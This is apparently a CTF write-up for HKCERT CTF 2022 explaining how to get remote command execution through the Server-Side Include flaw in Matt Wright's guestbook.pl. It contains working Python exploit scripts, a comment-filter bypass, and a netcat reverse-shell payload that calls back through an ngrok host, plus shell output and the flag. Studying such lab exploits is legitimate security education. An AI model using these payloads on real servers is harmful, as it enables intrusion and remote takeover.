# CVE 1999

## Overview

- Overall difficulty for me (From 1-10 stars): â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†â˜†â˜†

- Challenge difficulty: â˜…â˜…â˜†â˜†â˜†

## Background

[Old news](https://www-info-gov-hk.translate.goog/gia/general/200002/24/0224258.htm?_x_tr_sl=zh-TW&_x_tr_tl=en&_x_tr_hl=en-US&_x_tr_pto=wapp) is so existing

Web: [http://chal-a.hkcert22.pwnable.hk:28229/~matt/guestbook.html](http://chal-a.hkcert22.pwnable.hk:28229/~matt/guestbook.html) , [http://chal-b.hkcert22.pwnable.hk:28229/~matt/guestbook.html](http://chal-b.hkcert22.pwnable.hk:28229/~matt/guestbook.html)

Remark: The guestbook will be cleaned up per minute

## Find the flag

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2022/images/Pasted%20image%2020221112231222.png)

In here, we can see this is a **guestbook which created by Matt Wright**.

**addguest.html:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2022/images/Pasted%20image%2020221112231430.png)

**Also, we can send a POST request to `/~matt/cgi-bin/guestbook.pl`.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2022/images/Pasted%20image%2020221112231506.png)

**Let's use `searchsploit` to see is there any public exploits!**
```
â”Œâ”€â”€(rootðŸŒ¸siunam)-[~/ctf/HKCERT-CTF-2022/Web/CVE-1999]
â””â”€# searchsploit Matt Wright Guestbook
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ---------------------------------
Matt Wright Guestbook 2.3.1 - Guestbook.pl Multiple HTML Injection Vulne | cgi/webapps/27594.txt
The Matt Wright Guestbook.pl - Arbitrary Command Execution (Metasploit)  | cgi/webapps/16914.rb
The Matt Wright Guestbook.pl 2.3.1 - Server-Side Include                 | cgi/webapps/9907.rb
------------------------------------------------------------------------- ---------------------------------
```

**Looks like it's vulnerable to Server-Side Include (SSI)!**

**We can use `searchsploit -m` to mirror the exploit script:**
```
â”Œâ”€â”€(rootðŸŒ¸siunam)-[~/ctf/HKCERT-CTF-2022/Web/CVE-1999]
â””â”€# searchsploit -m 16914
```

**Snipped `16914.rb` exploit script:**
```ruby
	def exploit
		realname	= rand_text_alphanumeric(20)
		email		= rand_text_alphanumeric(20)
		city		= rand_text_alphanumeric(20)
		state		= rand_text_alphanumeric(20)
		country 	= rand_text_alphanumeric(20)

		sploit = Rex::Text.uri_encode("<!--#exec cmd=\"" + payload.encoded.gsub('"','\"') + "\"", 'hex-normal')

		req1 = send_request_cgi({
			'uri'     => datastore['URI'],
			'method'  => 'POST',
			'data'    => "realname=#{realname}&username=#{email}&city=#{city}&state=#{state}&country=#{country}&comments=#{sploit}",
		}, 25)

		req2 = send_request_raw({
			'uri'     => datastore['URIOUT'],
		}, 25)

	end
```

**Hmm... Looks like the `<!--#exec cmd="payload_here"` is the payload!**

**Let's write a simple python script to automate that!**
```py
#!/usr/bin/env python3

import requests
import string
import random
import sys
import urllib.parse

def main(payload):
	url = 'http://chal-a.hkcert22.pwnable.hk:28229/~matt/'
	payload = sys.argv[1]
	data = {
	'realname': ''.join(random.choices(string.ascii_letters, k=20)),
	'username': ''.join(random.choices(string.ascii_letters, k=20)),
	'url': ''.join(random.choices(string.ascii_letters, k=20)),
	'city': ''.join(random.choices(string.ascii_letters, k=20)),
	'state': ''.join(random.choices(string.ascii_letters, k=20)),
	'country': ''.join(random.choices(string.ascii_letters, k=20)),
	'comments': payload
}
	requests.post(url + 'cgi-bin/guestbook.pl', data=data)
	#requests.get(url + 'guestbook.html')

if __name__ == '__main__':
	if len(sys.argv) > 1:
		payload = sys.argv[1]
		main(payload)
	else:
		print(f'Usage: {sys.argv[0]} <payload>')
```

```
â”Œâ”€â”€(rootðŸŒ¸siunam)-[~/ctf/HKCERT-CTF-2022/Web/CVE-1999]
â””â”€# python3 chal_automate.py '<!--#exec cmd="/bin/ls /"'
```

**Now, when you refresh the `guessbook.html` page, you should see all the files in the target machine!**

> Note1: Although I get the flag, I have no idea why the exploit sometimes work, sometimes didn't work.

> Note2: After the CTF, [Kaiziron](https://twitter.com/kaiziron) said that the reason why it happens is because this:

```
$value =~ s/<!--(.|\n)*-->//g;
```

> To get the payload working, we need to put `-->` on another field to close the payload.

**Correct payload:**
```py
#!/usr/bin/env python3

import requests
import string
import random
import sys
import urllib.parse

def main(payload):
	url = 'http://chal-a.hkcert22.pwnable.hk:28229/~matt/'
	payload = sys.argv[1]
	data = {
	'realname': ''.join(random.choices(string.ascii_letters, k=20)),
	'username': ''.join(random.choices(string.ascii_letters, k=20)),
	'url': ''.join(random.choices(string.ascii_letters, k=20)),
	'city': ''.join(random.choices(string.ascii_letters, k=20)),
	'state': ''.join(random.choices(string.ascii_letters, k=20)),
	'country': '-->',
	'comments': payload
}
	# Send the payload
	requests.post(url + 'cgi-bin/guestbook.pl', data=data)
	
	# Trigger the payload
	requests.get(url + 'guestbook.html')

if __name__ == '__main__':
	if len(sys.argv) > 1:
		payload = sys.argv[1]
		main(payload)
	else:
		print(f'Usage: {sys.argv[0]} <payload>')
```

- Reverse shell:

**Ngrok for port forwarding:**
```
â”Œâ”€â”€(rootðŸŒ¸siunam)-[~/ctf/HKCERT-CTF-2022/Web/CVE-1999]
â””â”€# ngrok tcp 1337

Web Interface                 http://127.0.0.1:4040                                                        
Forwarding                    tcp://0.tcp.ap.ngrok.io:12434 -> localhost:1337
```


**Setup a `nc` listener:**
```
â”Œâ”€â”€(rootðŸŒ¸siunam)-[~/ctf/HKCERT-CTF-2022/Web/CVE-1999]
â””â”€# nc -lnvp 1337
listening on [any] 1337 ...
```

**Send the payload:**
```
â”Œâ”€â”€(rootðŸŒ¸siunam)-[~/ctf/HKCERT-CTF-2022/Web/CVE-1999]
â””â”€# python3 solve.py '<!--#exec cmd="nc 0.tcp.ap.ngrok.io 12434 -e /bin/bash"'
```

```
â”Œâ”€â”€(rootðŸŒ¸siunam)-[~/ctf/HKCERT-CTF-2022/Web/CVE-1999]
â””â”€# nc -lnvp 1337
listening on [any] 1337 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59618
whoami;hostname;id
daemon
chal29-cve-1999-0
uid=1(daemon) gid=1(daemon) groups=1(daemon)

ls -lah /
[...]
-r--r--r--   1 root root   54 Oct 30 03:53 flag
[...]

cat /flag
hkcert22{DiDu_c0opy_others_FLags_or_c0rnment_brb_Tags}
```

We got the flag!

# Conclusion

What we've learned:

1. Exploiting Server-Side Include Vulnerability